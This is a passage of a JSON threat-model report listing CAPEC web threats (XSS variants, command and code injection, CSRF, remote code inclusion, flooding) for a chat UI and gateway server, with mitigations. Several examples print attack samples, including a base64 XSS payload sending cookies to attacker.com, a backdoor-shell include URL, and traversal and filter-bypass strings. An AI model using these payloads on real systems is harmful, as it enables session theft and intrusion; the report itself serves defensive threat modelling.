"Catching exception throw/signal from privileged block", "details": "Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.", "example": "Attacker targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread. The Attacker could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.", "id": "52", "mitigations": "Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.", "references": "https://capec.mitre.org/data/definitions/236.html, http://cwe.mitre.org/data/definitions/270.html", "response": "", "severity": "Very High", "target": "WebChat / macOS UI", "threat_id": "AC14"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False or target.controls.validatesInput is False", "cvss": "", "description": "Filter Failure through Buffer Overflow", "details": "In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).", "example": "Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.", "id": "53", "mitigations": "Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.Pre-design: Use a language or compiler that performs automatic bounds checking.Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.Operational: Use OS-level preventative functionality. Not a complete solution.Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.", "references": "https://capec.mitre.org/data/definitions/24.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/680.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP24"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Resource Injection", "details": "An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.", "example": "A Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as '../../tomcat/confserver.xml', which causes the application to delete one of its own configuration files.", "id": "54", "mitigations": "Ensure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.", "references": "https://capec.mitre.org/data/definitions/240.html, https://capec.mitre.org/data/definitions/240.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP25"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Code Injection", "details": "An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.", "example": "When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.", "id": "55", "mitigations": "Utilize strict type, character, and encoding enforcementEnsure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.", "references": "https://capec.mitre.org/data/definitions/242.html, http://cwe.mitre.org/data/definitions/94.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP26"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Targeting HTML Attributes", "details": "An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.", "example": "Application allows execution of any Javascript they want on the browser which enables the adversary to steal session tokens and perform malicious activities.", "id": "56", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/243.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "INP27"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting URI Placeholders", "details": "An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.", "example": "The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.", "id": "57", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP28"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Doubled Characters", "details": "The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "example": "By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "id": "58", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/245.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "INP29"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Using Invalid Characters", "details": "An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.", "example": "The software may attempt to remove a 'javascript:' URI scheme, but a 'java%00script:' URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.", "id": "59", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end operations.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/247.html, https://cwe.mitre.org/data/definitions/86.html", "response": "", "severity": "Medium", "target": "WebChat / macOS UI", "threat_id": "INP30"}, {"assumption": null, "condition": "target.controls.usesParameterizedInput is False and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)", "cvss": "", "description": "Command Injection", "details": "An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.", "example": "Consider a URL 'http://sensitive/cgi-bin/userData.pl?doc=user1.txt'. If the URL is modified like so - 'http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|', it executed the command '/bin/ls|'. This is how command injection is implemented.", "id": "60", "mitigations": "All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.", "references": "https://capec.mitre.org/data/definitions/248.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP31"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XML Injection", "details": "An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.", "example": "Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.", "id": "61", "mitigations": "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.", "references": "https://capec.mitre.org/data/definitions/250.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP32"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Remote Code Inclusion", "details": "The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.", "example": "URL string http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_ contains an external reference to a backdoor code file stored in a remote location (http://www.hacker.com/backdoor_shell.php.) Having been uploaded to the application, this backdoor can later be used to hijack the underlying server or gain access to the application database.", "id": "62", "mitigations": "Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.", "references": "https://capec.mitre.org/data/definitions/253.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP33"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Leverage Alternate Encoding", "details": "An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.", "example": "Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.", "id": "63", "mitigations": "Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.", "references": "https://capec.mitre.org/data/definitions/267.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP35"}, {"assumption": null, "condition": "target.controls.implementsPOLP is False", "cvss": "", "description": "Schema Poisoning", "details": "An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.", "example": "In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input: { title: Contact, type: object, properties: { Name: { type: string }, Phone: { type: string }, Email: { type: string }, Address: { type: string } }, required: [Name, Phone, Email, Address] } If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named name, an adversary could make the following schema change: ALTER TABLE Contacts MODIFY Name VARCHAR(65353); The Name field of the Conteacts table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS.", "id": "64", "mitigations": "Design: Protect the schema against unauthorized modification.Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.", "references": "https://capec.mitre.org/data/definitions/271.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "AC15"}, {"assumption": null, "condition": "(target.controls.usesStrongSessionIdentifiers is False or target.controls.encryptsCookies is False) and target.controls.definesConnectionTimeout is False", "cvss": "", "description": "Session Hijacking - ClientSide", "details": "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.", "example": "Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim\u2019s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.", "id": "65", "mitigations": "Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.", "references": "https://capec.mitre.org/data/definitions/593.html", "response": "", "severity": "Very High", "target": "WebChat / macOS UI", "threat_id": "AC18"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Argument Injection", "details": "An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.", "example": "A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]", "id": "66", "mitigations": "Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.", "references": "https://capec.mitre.org/data/definitions/6.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "INP41"}, {"assumption": null, "condition": "target.controls.definesConnectionTimeout is False and (target.controls.usesMFA is False or target.controls.encryptsSessionData is False)", "cvss": "", "description": "Reusing Session IDs (aka Session Replay) - ClientSide", "details": "This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.", "example": "OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258", "id": "67", "mitigations": "Always invalidate a session ID after the user logout.Setup a session time out for the session IDs.Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.Encrypt the session data associated with the session ID.Use multifactor authentication.", "references": "https://capec.mitre.org/data/definitions/60.html", "response": "", "severity": "High", "target": "WebChat / macOS UI", "threat_id": "AC20"}, {"assumption": null, "condition": "target.controls.implementsCSRFToken is False or target.controls.verifySessionIdentifiers is False", "cvss": "", "description": "Cross Site Request Forgery", "details": "An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply riding the existing session cookie.", "example": "While a user is logged into his bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email. The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account. The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.", "id": "68", "mitigations": "Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.", "references": "https://capec.mitre.org/data/definitions/62.html", "response": "", "severity": "Very High", "target": "WebChat / macOS UI", "threat_id": "AC21"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "Server Side Include (SSI) Injection", "details": "An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.", "example": "Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the Options Includes directive enabled. Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error. When these logs are eventually reviewed, the server parses the SSI directives and executes them.", "id": "69", "mitigations": "Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them. All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive. Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead.", "references": "https://capec.mitre.org/data/definitions/101.html, http://cwe.mitre.org/data/definitions/97.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/713.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "INP03"}, {"assumption": null, "condition": "(target.controls.sanitizesInput is False or target.controls.validatesInput is False) or target.controls.encodesOutput is False", "cvss": "", "description": "Excavation", "details": "An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.", "example": "The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary's objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary.", "id": "70", "mitigations": "Minimize error/response output to only what is necessary for functional use or corrective language. Remove potentially sensitive information that is not necessary for the application's functionality.", "references": "https://capec.mitre.org/data/definitions/116.html, http://cwe.mitre.org/data/definitions/200.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "DS01"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Double Encoding", "details": "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.", "example": "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.", "id": "71", "mitigations": "Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).", "references": "https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "DE02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "72", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False or target.controls.isResilient is False", "cvss": "", "description": "Flooding", "details": "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.", "example": "Adversary tries to bring a network or service down by flooding it with large amounts of traffic.", "id": "73", "mitigations": "Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.", "references": "https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "DO01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "74", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Format String Injection", "details": "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.", "example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.", "id": "75", "mitigations": "Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.", "references": "https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "INP08"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Relative Path Traversal", "details": 